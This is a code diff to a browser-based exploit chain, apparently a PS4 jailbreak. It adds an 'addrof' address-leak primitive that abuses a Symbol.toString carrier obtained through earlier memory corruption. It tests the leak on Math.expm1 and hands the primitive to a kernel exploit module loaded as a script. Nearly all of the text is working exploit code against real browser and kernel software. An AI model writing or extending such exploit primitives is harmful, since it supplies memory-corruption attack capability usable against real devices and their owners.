@@ -508,7 +508,7 @@ var LITE = Q.get("l") === "1";
 var RUN_JAILBREAK = Q.get("jb") === "1";
 var RUN_KEX = Q.get("kex") === "1";
 
-var REVISION = "genuine-u8-rw-4-1352-probe-kex";
+var REVISION = "genuine-u8-rw-5-1352-probe-kex";
 var K = 2;
 var DUPLICATE_INDEX = 2;
 var CONTROL_INDEX = 0xffff;
@@ -1153,12 +1153,42 @@ function readBytes(addr, count) {
     return out;
 }
 
-// Carrier for kexploit/mem.mjs — fakeHost.q2 is the leak slot at hostAddress+0x20.
+// addrof via the same Symbol.toString carrier used for the initial R/W (slot 1 = target).
+function probeLeakvalObject(obj) {
+    if (!getterCarrier || !preparedSymbolObject)
+        throw new Error("addrof carrier unavailable");
+    var save1 = getterCarrier[1];
+    var save3 = getterCarrier[3];
+    try {
+        getterCarrier[1] = obj;
+        getterCarrier[3] = obj;
+        var str = symbolToString.call(preparedSymbolObject);
+        if (!str || str.length < 15)
+            throw new Error("addrof string too short len=" + (str ? str.length : 0));
+        var words = new Uint16Array(16);
+        for (var i = 0; i < 16; ++i)
+            words[i] = str.charCodeAt(7 + i);
+        var addr = pointerFromWords(words, 4);
+        if (!plausibleCell(addr))
+            throw new Error("addrof implausible " + hex(addr));
+        return {
+            low: addr >>> 0,
+            hi: (addr / 0x100000000) >>> 0
+        };
+    } finally {
+        getterCarrier[1] = save1;
+        getterCarrier[3] = save3;
+    }
+}
+
+// Carrier for kexploit/mem.mjs (aim/restore + probeLeakval for window.p.leakval).
 function buildProbeCarrierForKex() {
     if (!globalFakeArray || !probeVectorHome || !isFinite(hostAddress))
         throw new Error("probe R/W not ready");
     if (!fakeHost || fakeHost.q2 !== rwView)
         throw new Error("fakeHost shape lost");
+    if (!getterCarrier || !preparedSymbolObject)
+        throw new Error("addrof wrapper missing — keep groom roots live");
 
     function aimProbeVector(address) {
         var a = Number(address);
@@ -1182,6 +1212,7 @@ function buildProbeCarrierForKex() {
         leakSlotAddress: hostAddress + 0x20,
         setLeakSlot: function (value) { fakeHost.q2 = value; },
         clearLeakSlot: function () { fakeHost.q2 = rwView; },
+        probeLeakval: probeLeakvalObject,
         validate: plausibleCell,
         assertHome: function () {
             return rwView && rwMirror && targetView
@@ -1194,12 +1225,14 @@ function runKexploit() {
     if (kexploitStarted) return;
     kexploitStarted = true;
     try {
+        var leakTest = probeLeakvalObject(Math.expm1);
+        mark("KEX-LEAKVAL-OK", "expm1=0x" + leakTest.hi.toString(16) + leakTest.low.toString(16).padStart(8, "0"));
         globalThis.__PS4_PROBE_CARRIER__ = buildProbeCarrierForKex();
-        mark("KEX-CARRIER", "host=" + hex(hostAddress) + "-window=0x100");
+        mark("KEX-CARRIER", "host=" + hex(hostAddress) + "-window=0x100-addrof=symbol");
         setStatus("running", "KEXPLOIT CHAIN", "loading kexploit/chain.mjs on probe R/W");
         var el = document.createElement("script");
         el.type = "module";
-        el.src = "./kexploit/chain.mjs?probe=1&v=index-bridge-1";
+        el.src = "./kexploit/chain.mjs?probe=1&v=index-bridge-2-leakval";
         el.onerror = function () { mark("KEX-LOAD-FAIL", "chain.mjs module error"); };
         document.body.appendChild(el);
     } catch (error) {
